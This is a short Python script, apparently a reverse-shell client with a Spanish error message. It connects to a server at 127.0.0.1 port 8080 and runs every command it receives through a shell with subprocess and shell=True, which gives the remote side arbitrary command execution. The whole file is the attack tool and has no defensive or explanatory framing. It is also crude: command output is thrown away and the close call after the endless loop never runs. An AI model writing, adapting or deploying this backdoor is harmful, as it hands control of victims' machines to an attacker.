import socket
import subprocess

target = '127.0.0.1'
port = int(8080)
def exec(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((target, port))

def main():
    while True:
        command = connection.recv(1024)
        exec(command)
    connection.close()


if __name__ == '__main__':
    try:
        main()
    except ConnectionRefusedError:
        print('[ERROR] El servidor no permitio esta conexión')
